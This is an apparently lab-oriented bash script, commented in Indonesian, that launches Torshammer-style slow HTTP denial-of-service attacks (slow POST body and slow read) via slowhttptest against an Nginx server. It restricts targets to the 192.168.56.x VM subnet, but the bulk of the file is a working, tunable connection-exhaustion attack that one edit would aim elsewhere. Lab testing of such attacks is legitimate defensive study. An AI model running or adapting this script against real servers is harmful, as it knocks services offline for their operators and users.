#!/usr/bin/env bash
# attacker-torshammer.sh — Torshammer-style Slow HTTP POST body exhaustion
# VM lab only. Hanya subnet 192.168.56.x diizinkan.
#
# Torshammer berbeda dari Slowloris: mengirim POST dengan Content-Length besar
# tapi body dikirim sangat lambat (slow body), menahan koneksi lama.
# Menggunakan slowhttptest mode -B (slow body/POST) dan juga mode manual curl.
set -Eeuo pipefail

TARGET_IP="${TARGET_IP:-192.168.56.103}"
CONNECTIONS="${CONNECTIONS:-40}"
RATE="${RATE:-5}"
DURATION="${DURATION:-75}"
BODY_SIZE="${BODY_SIZE:-8192}"

log() {
  printf '[torshammer] %s\n' "$*"
}

die() {
  printf '[torshammer][ERROR] %s\n' "$*" >&2
  exit 1
}

validate_lab_ip() {
  case "$1" in
    192.168.56.*) ;;
    10.*|172.*|127.*|169.254.*|0.*|255.*) die "IP '$1' bukan subnet lab 192.168.56.x. Script dihentikan." ;;
    *.*.*.*) die "IP '$1' tidak diizinkan. Gunakan subnet VM lokal 192.168.56.x saja." ;;
    *) die "IP '$1' tidak valid." ;;
  esac
}

run_slow_body() {
  command -v slowhttptest >/dev/null 2>&1 || die "Install dulu: sudo apt install -y slowhttptest"
  log "Torshammer Slow Body POST: connections=$CONNECTIONS rate=$RATE duration=$DURATION body_size=$BODY_SIZE"
  # Mode -B: slow body / slow POST — mengirim body lambat
  slowhttptest -B -c "$CONNECTIONS" -i 10 -r "$RATE" \
    -s "$BODY_SIZE" \
    -t POST \
    -u "http://$TARGET_IP/" \
    -x 16 -p 3 -l "$DURATION" || true
}

run_slow_read() {
  command -v slowhttptest >/dev/null 2>&1 || die "Install dulu: sudo apt install -y slowhttptest"
  log "Torshammer Slow Read: connections=$CONNECTIONS rate=$RATE duration=$DURATION"
  # Mode -R: slow read (advertise kecil window TCP, baca respons sangat lambat)
  slowhttptest -R -c "$CONNECTIONS" -i 5 -r "$RATE" \
    -u "http://$TARGET_IP/" \
    -t GET \
    -x 16 -p 3 -l "$DURATION" \
    -w 10 -y 512 || true
}

main() {
  validate_lab_ip "$TARGET_IP"
  command -v curl >/dev/null 2>&1 || die "Install dulu: sudo apt install -y curl"
  command -v slowhttptest >/dev/null 2>&1 || die "Install dulu: sudo apt install -y slowhttptest"

  log "Cek target Nginx"
  curl -I --max-time 5 "http://$TARGET_IP/" || true

  log "Mulai Torshammer slow body POST"
  run_slow_body

  log "Mulai Torshammer slow read"
  run_slow_read

  log "Selesai: Torshammer slow HTTP"
}

main "$@"
